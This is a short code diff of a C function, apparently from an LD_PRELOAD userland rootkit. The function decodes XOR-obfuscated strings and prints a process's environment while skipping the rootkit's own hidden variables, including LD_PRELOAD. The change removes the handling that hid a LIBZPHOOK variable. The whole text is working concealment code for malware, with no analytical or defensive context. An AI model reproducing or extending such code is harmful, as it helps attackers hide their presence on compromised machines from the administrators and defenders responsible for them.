@@ -13,7 +13,6 @@ void hide_exec_env(char **argv, char **envp) {
     }
 
     char *hidden_str = strdup(HIDDEN_STR); xor(hidden_str);
-    char *libzphook = strdup(LIBZPHOOK); xor(libzphook);
     char *ld_preload = strdup(LD_PRELOAD); xor(ld_preload);
     char *hidden_env_var_name = strdup(HIDDEN_ENV_VAR_NAME); xor(hidden_env_var_name);
     for (int j=0; j <= i; j++) {
@@ -31,15 +30,9 @@ void hide_exec_env(char **argv, char **envp) {
             DEBUG_MSG("[!] Skipping hidden env var line\n");
             continue;
         }
-        // Skip line with LIPZPHOOK=
-        else if (strcmp(env_var_name, libzphook) == 0) {
-            DEBUG_MSG("[!] Skipping LIBZPHOOK line\n");
-            continue;
-        }
         printf("%s=%s\n", env_var_name, env_var_val);
     }
     CLEAN(hidden_str);
-    CLEAN(libzphook);
     CLEAN(ld_preload);
     CLEAN(hidden_env_var_name);
     exit(0);
